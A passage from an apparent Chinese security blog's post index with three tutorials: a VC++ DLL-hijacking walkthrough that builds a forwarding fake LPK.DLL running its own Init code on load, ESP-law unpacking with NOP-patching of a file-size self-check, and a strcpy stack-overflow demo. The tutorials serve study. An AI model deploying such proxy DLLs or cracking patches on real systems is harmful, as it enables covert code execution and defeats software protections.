&amp;emsp;&amp;emsp;由于输入表中只包含DLL名而没有它的路径名，因此加载程序必须在磁盘上搜索DLL文件。首先会尝试从当前程序所在的目录加载DLL，如果没找到，则在Windows系统目录中查找，最后是在环境变量中列出的各个目录下查找。利用这个特点，先伪造一个系统同名的DLL，提供同样的输出表，每个输出函数转向真正的系统DLL。程序调用系统DLL时会先调用当前目录下伪造的DLL，完成相关功能后，再跳到系统DLL同名函数里执行。这个过程用个形象的词来描述就是系统DLL被劫持（hijack）了。 &amp;emsp;&amp;emsp;●DLL劫持的实现●这一步我们的工作就是通过编程来实现一个LPK.DLL文件，它与系统目录下的LPK.DLL导出表相同，并能加载系统目录下的LPK.DLL，并且能将导出表转发到真实的LPK.DLL。可以看出我们要实现的这个DLL需求如下： 1 、构造一个与系统目录下LPK.DLL一样的导出表； 2、加载系统目录下的LPK.DLL； 3、将导出函数转发到系统目录下的LPK.DLL上； 4、在初始化函数中加入我们要执行的代码。 我们使用VC++来进行开发，首先是定义导出函数。核心代码如下： #pragma comment(linker, &quot;/EXPORT:LpkInitialize=_gamehacker_LpkInitialize,@1&quot;) #pragma comment(linker, &quot;/EXPORT:LpkTabbedTextOut=_gamehacker_LpkTabbedTextOut,@2&quot;) #pragma comment(linker, &quot;/EXPORT:LpkDllInitialize=_gamehacker_LpkDllInitialize,@3&quot;) #pragma comment(linker, &quot;/EXPORT:LpkDrawTextEx=_gamehacker_LpkDrawTextEx,@4&quot;) #pragma comment(linker, &quot;/EXPORT:LpkExtTextOut=_gamehacker_LpkExtTextOut,@6&quot;) #pragma comment(linker, &quot;/EXPORT:LpkGetCharacterPlacement= _gamehacker_LpkGetCharacterPlacement,@7&quot;) #pragma comment(linker, &quot;/EXPORT:LpkGetTextExtentExPoint=_gamehacker_LpkGetTextExtentExPoint,@8&quot;) #pragma comment(linker, &quot;/EXPORT:LpkPSMTextOut=_gamehacker_LpkPSMTextOut,@9&quot;) #pragma comment(linker, &quot;/EXPORT:LpkUseGDIWidthCache=_gamehacker_LpkUseGDIWidthCache,@10&quot;) #pragma comment(linker, &quot;/EXPORT:ftsWordBreak=_gamehacker_ftsWordBreak,@11&quot;) 以上是导出表中的函数，LPK.DLL比较特殊，在导入表中有一项不是函数是数据，因此数据这部分要单独处理。核心代码如下： ★ EXTERNC void __cdecl gamehacker_LpkEditControl(void); EXTERNC __declspec(dllexport) void (*LpkEditControl[14])() = &#123;gamehacker_LpkEditControl&#125;; ★ LpkEditControl这个数组有14个成员，如上定义即可，后面我们还需要将真正的数据复制过来。加载系统目录下的LPK.DLL。核心代码如下： ★ inline BOOL WINAPI Load() { TCHAR tzPath[MAX_PATH]; TCHAR tzTemp[MAX_PATH * 2]; GetSystemDirectory(tzPath, MAX_PATH); lstrcat(tzPath, TEXT(“\\lpk”)); m_hModule&#x3D;LoadLibrary(tzPath); return (m_hModule !&#x3D; NULL); } ★在代码中可以看到，使用LoadLibrary方式加载系统目录下的LPK.DLL。加载完成后就要实现导出函数的转发了，这步是很关键的。首先要获得原函数地址。核心代码如下： ★ FARPROC WINAPI GetAddress(PCSTR pszProcName) &#123; FARPROC fpAddress; CHAR szProcName[16]; TCHAR tzTemp[MAX_PATH]; fpAddress = GetProcAddress(m_hModule, pszProcName); return fpAddress; &#125; ★ 然后将我们构造的导出函数一一转发。核心代码如下： ★ ALCDECL gamehacker_LpkInitialize(void) &#123; GetAddress(&quot;LpkInitialize&quot;); __asm JMP EAX; &#125; ALCDECL gamehacker_LpkTabbedTextOut(void) &#123; GetAddress(&quot;LpkTabbedTextOut&quot;); __asm JMP EAX; &#125; ALCDECL gamehacker_LpkDllInitialize(void) &#123; GetAddress(&quot;LpkDllInitialize&quot;); __asm JMP EAX; &#125; ALCDECL gamehacker_LpkDrawTextEx(void) &#123; GetAddress(&quot;LpkDrawTextEx&quot;); __asm JMP EAX; &#125; ALCDECL gamehacker_LpkEditControl(void) &#123; GetAddress(&quot;LpkEditControl&quot;); __asm jmp DWORD ptr [EAX]; &#125; ALCDECL gamehacker_LpkExtTextOut(void) &#123; GetAddress(&quot;LpkExtTextOut&quot;); __asm JMP EAX; &#125; ALCDECL gamehacker_LpkGetCharacterPlacement(void) &#123; GetAddress(&quot;LpkGetCharacterPlacement&quot;); __asm JMP EAX; &#125; ALCDECL gamehacker_LpkGetTextExtentExPoint(void) &#123; GetAddress(&quot;LpkGetTextExtentExPoint&quot;); __asm JMP EAX; &#125; ALCDECL gamehacker_LpkPSMTextOut(void) &#123; GetAddress(&quot;LpkPSMTextOut&quot;); __asm JMP EAX; &#125; ALCDECL gamehacker_LpkUseGDIWidthCache(void) &#123; GetAddress(&quot;LpkUseGDIWidthCache&quot;); __asm JMP EAX; &#125; ALCDECL gamehacker_ftsWordBreak(void) &#123; GetAddress(&quot;ftsWordBreak&quot;); __asm JMP EAX; &#125; ★ 转发完之后不要忘记LpkEditControl哦，要将真实数据复制过来。核心代码如下：★ memcpy((LPVOID)(LpkEditControl+1), (LPVOID)((int*)GetAddress(“LpkEditControl”) + 1),52); ★好了，到这里整个DLL劫持基本就算完成了，也许你要问，那我们要执行的代码写在哪里？我的方法是将其写到初始化函数中。这样当DLL被加载的时候就会执行。下面看一下DLL的入口函数吧。 ★ BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved) &#123; if (dwReason == DLL_PROCESS_ATTACH) &#123; DisableThreadLibraryCalls(hModule); if(Load()) &#123; memcpy((LPVOID)(LpkEditControl+1), (LPVOID)((int*)GetAddress(&quot;LpkEditControl&quot;) + 1),52); _beginthread(Init,NULL,NULL); &#125; else return FALSE; &#125; else if (dwReason == DLL_PROCESS_DETACH) &#123; Free(); &#125; return TRUE; &#125; ★ 在这个函数中我们看到，当加载系统目录下的LPK.DLL成功后，进行了LpkEditControl数组的复制，并通过_beginthread(Init,NULL,NULL);定义了初始化函数Init，而这个初始化函数是由我们控制的。下面在初始化函数Init中写入测试代码如下： ★ void WINAPIV Init(LPVOID pParam); void WINAPIV Init(LPVOID pParam) &#123; TCHAR tzPath[MAX_PATH]; TCHAR tzTemp[MAX_PATH * 2]; wsprintf(tzTemp, TEXT(&quot;劫持函数运行了.......&quot;), tzPath); MessageBox(NULL, tzTemp, TEXT(&quot;gamehacker&quot;), MB_ICONSTOP); return; &#125; ★","categories":[{"name":"网络","slug":"网络","permalink":"http://zwjsfdbb.top/categories/%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"网络","slug":"网络","permalink":"http://zwjsfdbb.top/tags/%E7%BD%91%E7%BB%9C/"}]},{"title":"esp脱壳+文件大小自校验","slug":"esp脱壳+文件大小自校验","date":"2017-07-14T16:00:00.000Z","updated":"2017-07-15T02:25:06.406Z","comments":true,"path":"2017/07/15/esp脱壳+文件大小自校验/","link":"","permalink":"http://zwjsfdbb.top/2017/07/15/esp%E8%84%B1%E5%A3%B3+%E6%96%87%E4%BB%B6%E5%A4%A7%E5%B0%8F%E8%87%AA%E6%A0%A1%E9%AA%8C/","excerpt":"###步骤如下 1.查壳由图可见，显然有壳 2.找oep(ESP定律) 程序加载进OD，F8单步运行，右边寄存器窗口发现只有esp的值在变，符合ESP定律。在寄存器位置右键，点击HW-break下硬件断点。然后F9运行到断点处，到达跳转到oep 的前一步，单步运行，遇到如下图：右键分析点击在模块中删除分析，即得到OEP.在oep处右键用ollydump脱壳当前进程。复制当前oep. 3.脱壳(LordPE) 在lordPE中打开样本程序，选中右键纠正镜像大小，再右键完全脱壳。 4.修复导入表(ImportREC) 在ImportREC中打开目标进程即样本进程，然后右边选项中输入之前在OD中选中的OEP，点击IAT自动搜索，然后点击获取导入表。","text":"###步骤如下 1.查壳由图可见，显然有壳 2.找oep(ESP定律) 程序加载进OD，F8单步运行，右边寄存器窗口发现只有esp的值在变，符合ESP定律。在寄存器位置右键，点击HW-break下硬件断点。然后F9运行到断点处，到达跳转到oep 的前一步，单步运行，遇到如下图：右键分析点击在模块中删除分析，即得到OEP.在oep处右键用ollydump脱壳当前进程。复制当前oep. 3.脱壳(LordPE) 在lordPE中打开样本程序，选中右键纠正镜像大小，再右键完全脱壳。 4.修复导入表(ImportREC) 在ImportREC中打开目标进程即样本进程，然后右边选项中输入之前在OD中选中的OEP，点击IAT自动搜索，然后点击获取导入表。 5.文件大小自检 脱壳以后双击没得反应，可能是有文件大小自检校验，脱壳后的程序载入OD，在GetFileSize函数下断点，在插件中选API断点设置工具-&gt;常用API断点。选中文件类的GetFileSize.然后F9运行程序，到断点处停下，在堆栈中右键反汇编跟随，找到调用这个函数的位置，然后下断点，把刚刚的那个断点删除。在断点后发现是几个cmp ,很明显是比较文件大小，故而把这两个ｃｍｐ右键二进制－＞用ｎｏｐ填充。然后复制到可执行文件，保存文件。再次点击程序，发现正常运行。 **注：esp 定律** ESP定律算是我们在脱壳当中最常使用的方法之一，也特别适合像我一样的新手！而今天文章说的是ESP脱壳的原理和分析！只有知道原理了，我们的技术才能走得列远！ 一.准备知识在我们开始讨论ESP定律之前，我先给你讲解一下一些简单的汇编知识。 1.call 这个命令是访问子程序的一个汇编基本指令。也许你说，这个我早就知道了！别急请继续看完。call真正的意义是什么呢？我们可以这样来理解： 1.向堆栈中压入下一行程序的地址；2.JMP到call的子程序地址处。 例如： 代码: 00401029.E8 DA240A00 call 004A35080040102E.5A pop edx 在执行了00401029以后，程序会将0040102E压入堆栈，然后JMP到004A3508地址处！ 2.RETN 与call对应的就是RETN了。对于RETN我们可以这样来理解： 1.将当前的ESP中指向的地址出栈； 2.JMP到这个地址。 这个就完成了一次调用子程序的过程。在这里关键的地方是：如果我们要返回父程序，则当我们在堆栈中进行堆栈的操作的时候，一定要保证在RETN这条指令之前，ESP指向的是我们压入栈中的地址。这也就是著名的“堆栈平衡”原理！ 3.狭义ESP定律 ESP定律的原理就是“堆栈平衡”原理。 让我们来到程序的入口处看看吧！ 1.这个是加了ASPACK壳的入口时各个寄存器的值！ 代码: EAX 00000000 ECX 0012FFB0 EDX 7FFE0304 &#x2F;&#x2F;堆栈值 EBX 7FFDF000 &#x2F;&#x2F;堆栈值 ESP 0012FFC4 EBP 0012FFF0 ESI 77F57D70 ntdll.77F57D70 EDI 77F944A8 ntdll.77F944A8 EIP 0040D000 ASPACK. 2.这个是ASPACK壳JMP到OEP后的寄存器的值！ 代码: EAX 004010CC ASPACK.004010CC ECX 0012FFB0 EDX 7FFE0304 &#x2F;&#x2F;堆栈值 EBX 7FFDF000 &#x2F;&#x2F;堆栈值 ESP 0012FFC4 EBP 0012FFF0 ESI 77F57D70 ntdll.77F57D70 EDI 77F944A8 ntdll.77F944A8 EIP 004010CC ASPACK.004010CC 呵呵~是不是除了EIP不同以外，eax保存当前OEP值，其他都一模一样啊！ 为什么会这样呢？我们来看看 0040D000 A&gt; 60 pushad &#x2F;&#x2F;注意这里ESP&#x3D;0012FFC4 0040D001 E8 00000000 call ASPACK.0040D006 &#x2F;&#x2F;ESP&#x3D;0012FFA4 PUSHAD就是把所有寄存器压栈！我们在到壳的最后看看： 代码: 0040D558 61 popad &#x2F;&#x2F;ESP&#x3D;0012FFA4 0040D559 75 08 jnz short ASPACK.0040D563 &#x2F;&#x2F;注意这里ESP&#x3D;0012FFC4 也就是说当我们对ESP的0012FFA4下硬件访问断点之后。当程序要通过堆栈访问这些值，从而恢复原来寄存器的值，准备跳向苦苦寻觅的OEP的时候，OD帮助我们中断下来。 小结：我们可以把壳假设为一个子程序，当壳把代码解压前和解压后，他必须要做的是遵循堆栈平衡的原理。 因为大家对ESP理解各有异同，但是，大同小异！一般理解可以为： 1、在命令行下断hr esp-4（此时的ESP就是OD载入后当前显示的值） 2、hr ESP(关键标志下一行代码所指示的ESP值(单步通过))","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"栈基础知识","slug":"栈基础知识","date":"2017-07-09T16:00:00.000Z","updated":"2017-07-10T03:43:57.414Z","comments":true,"path":"2017/07/10/栈基础知识/","link":"","permalink":"http://zwjsfdbb.top/2017/07/10/%E6%A0%88%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","excerpt":"1.C语言变量的分布 ：C 语言有全局变量(Global)、本地变量(Local)，静态变量(Static)、寄存器变量(Regeister)。每种变量都有不同的分配方式。先来看下面这段代码： #include &lt;stdio.h&gt; int g1=0, g2=0, g3=0; int main() &#123; static int s1=0, s2=0, s3=0; int v1=0, v2=0, v3=0; //打印出各个变量的内存地址 printf(&quot;0x%08x\\n&quot;,&amp;v1); //打印各本地变量的内存地址 printf(&quot;0x%08x\\n&quot;,&amp;v2); printf(&quot;0x%08x\\n\\n&quot;,&amp;v3); printf(&quot;0x%08x\\n&quot;,&amp;g1); //打印各全局变量的内存地址 printf(&quot;0x%08x\\n&quot;,&amp;g2); printf(&quot;0x%08x\\n\\n&quot;,&amp;g3); printf(&quot;0x%08x\\n&quot;,&amp;s1); //打印各静态变量的内存地址 printf(&quot;0x%08x\\n&quot;,&amp;s2); printf(&quot;0x%08x\\n\\n&quot;,&amp;s3); system(&quot;pause&quot;); return 0; &#125; 可以看出本地变量和全局&#x2F;静态变量的分布完全不同，相差甚远，这是因为他们分布在不同类型的区域。进程的内存空间分为：代码区，静态数据区和动态数据区。全局和静态变量分配在静态数据区，本地变量分配在动态数据区，即”堆栈“， 2. 栈的存储 #include &lt;stdio.h&gt; void __stdcall func(int param1,int param2,int param3) &#123; int var1=param1; int var2=param2; int var3=param3; printf(&quot;0x%08x\\n&quot;,&amp;parameter1); //打印出各个变量的内存地址 printf(&quot;0x%08x\\n&quot;,&amp;parameter2); printf(&quot;0x%08x\\n\\n&quot;,&amp;parameter3); printf(&quot;0x%08x\\n&quot;,&amp;var1); printf(&quot;0x%08x\\n&quot;,&amp;var2); printf(&quot;0x%08x\\n\\n&quot;,&amp;var3); return; &#125; int main() &#123; func(1,2,3); return 0; &#125; 函数的参数是从右向左传递，即先压栈parameter 3，然后parameter 2，最后才是parameter 1，然后是函数的返回地址，然后就是本地变量var1，var2,var3 3.程序进入main()函数 ，栈帧的保存和关闭例如：","text":"1.C语言变量的分布 ：C 语言有全局变量(Global)、本地变量(Local)，静态变量(Static)、寄存器变量(Regeister)。每种变量都有不同的分配方式。先来看下面这段代码： #include &lt;stdio.h&gt; int g1=0, g2=0, g3=0; int main() &#123; static int s1=0, s2=0, s3=0; int v1=0, v2=0, v3=0; //打印出各个变量的内存地址 printf(&quot;0x%08x\\n&quot;,&amp;v1); //打印各本地变量的内存地址 printf(&quot;0x%08x\\n&quot;,&amp;v2); printf(&quot;0x%08x\\n\\n&quot;,&amp;v3); printf(&quot;0x%08x\\n&quot;,&amp;g1); //打印各全局变量的内存地址 printf(&quot;0x%08x\\n&quot;,&amp;g2); printf(&quot;0x%08x\\n\\n&quot;,&amp;g3); printf(&quot;0x%08x\\n&quot;,&amp;s1); //打印各静态变量的内存地址 printf(&quot;0x%08x\\n&quot;,&amp;s2); printf(&quot;0x%08x\\n\\n&quot;,&amp;s3); system(&quot;pause&quot;); return 0; &#125; 可以看出本地变量和全局&#x2F;静态变量的分布完全不同，相差甚远，这是因为他们分布在不同类型的区域。进程的内存空间分为：代码区，静态数据区和动态数据区。全局和静态变量分配在静态数据区，本地变量分配在动态数据区，即”堆栈“， 2. 栈的存储 #include &lt;stdio.h&gt; void __stdcall func(int param1,int param2,int param3) &#123; int var1=param1; int var2=param2; int var3=param3; printf(&quot;0x%08x\\n&quot;,&amp;parameter1); //打印出各个变量的内存地址 printf(&quot;0x%08x\\n&quot;,&amp;parameter2); printf(&quot;0x%08x\\n\\n&quot;,&amp;parameter3); printf(&quot;0x%08x\\n&quot;,&amp;var1); printf(&quot;0x%08x\\n&quot;,&amp;var2); printf(&quot;0x%08x\\n\\n&quot;,&amp;var3); return; &#125; int main() &#123; func(1,2,3); return 0; &#125; 函数的参数是从右向左传递，即先压栈parameter 3，然后parameter 2，最后才是parameter 1，然后是函数的返回地址，然后就是本地变量var1，var2,var3 3.程序进入main()函数 ，栈帧的保存和关闭例如： int main（） &#123; return0； &#125; 汇编代码为： push ebp; 保存进入main()函数时其他初始化函数的栈底 move ebp,esp; 把当前esp的值作为栈底 sub esp ,40h 开辟栈空间，作为局部变量的存储空间 push ebx push esi push edi 保存寄存器的值 LEA edi ,[ebp-40h] 取出此函数可用栈空间首地址 mov ecx,10h 设置ecx寄存器的值 mov eax ,occcccccch 把局部变量初始化为0xcccccccch rep stos dword ptr [edi] 根据ecx的值，把eax的内容，以四字节为单位写到edi指向的内存 xor eax,eax 设置返回值为0 pop edi pop esi pop ebx 弹出压入寄存器的值 add esp,40h 降低esp,局部空间释放 cmp ebp,esp 检查栈平衡 call _chkesp() 进入栈错误检查函数 mov esp.ebp 还原esp pop ebp 还原ebp ret 4. 简单的分配栈帧及溢出修改相邻变量例如： #include &lt;windows.h&gt; #define PASSWORD &quot;1234567&quot; int verify_password(char *password)&#123; int authenticated; char buffer[8]; authenticated = strcmp(password,PASSWORD); strcpy(buffer,password); return authenticated; &#125; int main(int argc, char* argv[]) &#123; int valid_flag = 0; char password[1024]; FILE *fp; if (!(fp=fopen(&quot;password.txt&quot;,&quot;rw+&quot;)))&#123; return 0; &#125; fscanf(fp,&quot;%s&quot;,password); valid_flag = verify_password(password); if(valid_flag)&#123; printf(&quot;incorrect password!\\n&quot;); &#125;else&#123; printf(&quot;Congratulation! You have passed the verification !\\n&quot;); &#125; Sleep(-1); return 1; &#125; 用OD调试：进入main()主函数，找到验证密码的函数调用位置，进入到函数具体代码处： 前面部分就是栈分配局部变量空间和初始化的过程，然后就是字符串的计较，最后是字符串的复制，分析可得栈溢出在这一部分，在指令008D1409处把函数的返回值（EAX储存的是返回值）存在了EBP-0XC处，下面就是strocpy的操作，char buffer[8]分配了八个字节的存储空间，但是password.txt的密码如图为24个字节，知错执行strcpy的时候，把buffer 附近的变量空间也给覆盖了，比如返回值的。以上过程如图所示","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]}],"categories":[{"name":"恶意代码","slug":"恶意代码","permalink":"http://zwjsfdbb.top/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/categories/%E6%9D%82%E5%AD%A6/"},{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"},{"name":"网络","slug":"网络","permalink":"http://zwjsfdbb.top/categories/%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"http://zwjsfdbb.top/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/tags/%E6%9D%82%E5%AD%A6/"},{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"},{"name":"网络","slug":"网络","permalink":"http://zwjsfdbb.top/tags/%E7%BD%91%E7%BB%9C/"}]}